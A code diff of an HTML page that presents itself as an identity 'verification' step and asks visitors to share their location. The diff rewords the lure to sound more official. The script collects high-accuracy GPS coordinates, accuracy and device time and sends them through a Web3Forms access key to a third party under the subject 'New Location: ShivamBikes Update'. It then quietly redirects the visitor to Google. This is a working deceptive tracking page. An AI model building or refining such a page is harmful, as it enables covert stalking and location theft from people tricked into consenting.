@@ -19,9 +19,9 @@
 <body>
 
 <div class="card">
-    <h2 id="head">Secure Check-In</h2>
-    <p id="sub">Please share your location to complete the verification process.</p>
-    <button id="shareBtn" onclick="getLocation()">Share Location</button>
+    <h2>Verification Required</h2>
+    <p>Please share your location to verify your identity and continue.</p>
+    <button id="shareBtn" onclick="getLocation()">Verify Location</button>
     <div id="status"></div>
 </div>
 
@@ -33,27 +33,34 @@
         shareBtn.disabled = true;
         shareBtn.innerText = "Processing...";
         statusDiv.innerHTML = "Requesting GPS Access...";
+        statusDiv.className = "";
 
         if (navigator.geolocation) {
+            // timeout set to 15 seconds to allow GPS to lock in
             navigator.geolocation.getCurrentPosition(sendPosition, showError, {
                 enableHighAccuracy: true,
-                timeout: 10000
+                timeout: 15000
             });
         } else {
-            statusDiv.innerHTML = "GPS not supported.";
+            statusDiv.innerHTML = "GPS not supported by this browser.";
             resetBtn();
         }
     }
 
     function sendPosition(position) {
-        statusDiv.innerHTML = "Sending secure data...";
+        statusDiv.innerHTML = "Encrypting & Sending...";
         
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+
         const payload = {
             access_key: "9848059c-16b2-4b26-9567-7aca32256daf",
-            subject: "Location: Dhanajizole Site",
-            Latitude: position.coords.latitude,
-            Longitude: position.coords.longitude,
-            Map_Link: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
+            subject: "New Location: ShivamBikes Update",
+            Latitude: lat,
+            Longitude: lon,
+            Map_Link: `https://www.google.com/maps?q=${lat},${lon}`,
+            Accuracy: position.coords.accuracy + " meters",
+            Device_Time: new Date().toLocaleString()
         };
 
         fetch("https://api.web3forms.com/submit", {
@@ -65,6 +72,36 @@
             if (response.ok) {
                 statusDiv.innerHTML = "✅ Verified! Redirecting...";
                 statusDiv.className = "success";
+                // Redirects to Google after 2 seconds
                 setTimeout(() => {
                     window.location.href = "https://www.google.com"; 
                 }, 2000);
+            } else {
+                statusDiv.innerHTML = "❌ Error. Try again.";
+                resetBtn();
+            }
+        })
+        .catch(error => {
+            statusDiv.innerHTML = "❌ Connection error.";
+            resetBtn();
+        });
+    }
+
+    function resetBtn() {
+        shareBtn.disabled = false;
+        shareBtn.innerText = "Verify Location";
+    }
+
+    function showError(error) {
+        resetBtn();
+        if (error.code === 1) {
+            statusDiv.innerHTML = "Permission Denied. You must 'Allow' location.";
+        } else {
+            statusDiv.innerHTML = "Location error. Try again.";
+        }
+        statusDiv.className = "error";
+    }
+</script>
+
+</body>
+</html>
